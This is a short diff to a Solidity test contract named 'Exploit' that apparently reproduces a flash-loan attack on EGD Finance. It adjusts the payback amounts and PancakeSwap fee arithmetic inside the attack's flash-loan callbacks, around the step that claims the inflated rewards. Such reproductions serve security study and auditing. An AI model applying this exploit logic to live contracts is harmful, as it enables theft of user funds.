@@ -103,7 +103,7 @@ contract Exploit is Test {
                 IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp
             );
 
-            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Attacker payback 2,010 USDT (w/ 0.5% fee)
+            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 1e18); // Pancakeswap fee is 0.25%, so attacker need to payback usdt >2000/0.9975 (Cannot be exactly %0.25)
             require(suc, "Flashloan[1] payback failed");
         } else {
             console.log("Flashloan[2] received");
@@ -113,7 +113,7 @@ contract Exploit is Test {
             IEGD_Finance(EGD_Finance).claimAllReward();
             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
             // -----------------------------------------------------------------
-            uint256 swapfee = amount1 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap
+            uint256 swapfee = (amount1 * 10000 / 9970) - amount1; // Attacker need to pay >0.25% fee to Pancakeswap
             bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);
             require(suc, "Flashloan[2] payback failed");
         }
